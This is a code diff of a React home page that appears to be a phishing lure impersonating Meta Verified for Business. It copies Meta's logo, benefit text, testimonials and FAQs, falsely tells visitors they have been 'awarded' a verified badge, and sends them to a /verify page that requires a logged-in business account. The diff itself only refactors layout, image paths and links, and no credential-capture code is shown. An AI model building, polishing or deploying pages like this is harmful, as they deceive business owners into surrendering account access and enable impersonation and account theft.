@@ -1,23 +1,22 @@
 import { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
 
 export default function Home() {
-  const navigate = useNavigate();
-  
-  const benefitsData = [
-    { title: 'Verified badge', desc: 'With a verified badge on your Page, new audiences can feel more confident interacting with you. The badge means your Page has been verified by Meta based on your activity across Meta technologies, or information or documents you provided.', image: '/benefit-1.webp' },
-    { title: 'Impersonation protection', desc: 'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.', image: '/benefit-2.webp' },
-    { title: 'Enhanced support', desc: 'Get 24/7 access to email or chat agent support.', image: '/benefit-3.webp' },
-    { title: 'Upgraded profile features', desc: 'Enrich your profile by adding images to your links.', image: '/benefit-4.webp' }
-  ];
   const [activeBenefit, setActiveBenefit] = useState(0);
+  const [currentSlide, setCurrentSlide] = useState(0);
+  const [openFaq, setOpenFaq] = useState(null);
+
+  const benefitsData = [
+    { title: 'Verified badge', desc: 'With a verified badge on your Page, new audiences can feel more confident interacting with you. The badge means your Page has been verified by Meta based on your activity across Meta technologies, or information or documents you provided.', image: '/images/benefit-1.webp' },
+    { title: 'Impersonation protection', desc: 'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.', image: '/images/benefit-2.webp' },
+    { title: 'Enhanced support', desc: 'Get 24/7 access to email or chat agent support.', image: '/images/benefit-3.webp' },
+    { title: 'Upgraded profile features', desc: 'Enrich your profile by adding images to your links.', image: '/images/benefit-4.webp' }
+  ];
 
   const testimonials = [
     { quote: '"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience."', author: 'Kimber Greenwood, Owner of Water Bear Photography' },
     { quote: '"Since subscribing, I\'ve noticed a real difference. My posts are getting more reach, engagement has gone up."', author: 'Devon Kirby, Owner, Mom Approved Miami' },
     { quote: '"Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business."', author: 'Sarah Clancy, Owner of Sarah Marie Running Co.' }
   ];
-  const [currentSlide, setCurrentSlide] = useState(0);
 
   const faqs = [
     { q: 'How do I know if my business is eligible?', a: 'Meta Verified is available for businesses that meet certain eligibility requirements in selected regions.' },
@@ -27,13 +26,12 @@ export default function Home() {
     { q: 'Where will my badge appear?', a: 'Facebook Page and Messenger account, or Instagram account and Threads, depending on the asset you select.' },
     { q: 'What determines which plans I can purchase?', a: 'Meta determines plan availability based on your business activity across our apps.' }
   ];
-  const [openFaq, setOpenFaq] = useState(null);
 
   return (
     <div style={{ overflowX: 'hidden' }}>
       <header className="header">
           <div className="header-left">
-              <a href="/" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta for Business" /></a>
+              <a href="/live" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta for Business" /></a>
               <nav className="nav-links">
                   <a className="nav-link" href="#steps">Get started</a>
                   <a className="nav-link" href="#benefits">Advertise</a>
@@ -54,11 +52,11 @@ export default function Home() {
                       <svg className="hero-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                       <h1 className="hero-title">Congratulations! You've been awarded the Official Verified Badge.</h1>
                       <p className="hero-subtitle">Your business has met our verification requirements and is now eligible to display the official badge. Complete the quick steps below to activate it.</p>
-                      <button className="btn-primary" onClick={() => navigate('/verify')}>Claim your badge</button>
+                      <a href="/verify" className="btn-primary" style={{display: 'inline-block', textDecoration: 'none'}}>Claim your badge</a>
                       <p className="hero-note">To activate your Official Verified Badge, you must be logged in to a professional account (Instagram) or a Business Page (Facebook).</p>
                   </div>
               </div>
-              <div className="hero-image"><img src="/hero.webp" alt="Meta Verified for Business" /></div>
+              <div className="hero-image"><img src="/images/hero.webp" alt="Meta Verified for Business" /></div>
           </div>
       </section>
 
@@ -116,9 +114,9 @@ export default function Home() {
               <div className="cta-content">
                   <svg className="cta-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                   <h2 className="cta-title">Ready to activate your Official Verified Badge?</h2>
-                  <button className="btn-primary" onClick={() => navigate('/verify')}>Claim your badge</button>
+                  <a href="/verify" className="btn-primary" style={{display: 'inline-block', textDecoration: 'none'}}>Claim your badge</a>
               </div>
-              <div className="cta-image"><img src="/hero.webp" alt="Meta Verified" /></div>
+              <div className="cta-image"><img src="/images/hero.webp" alt="Meta Verified" /></div>
           </div>
       </section>
 
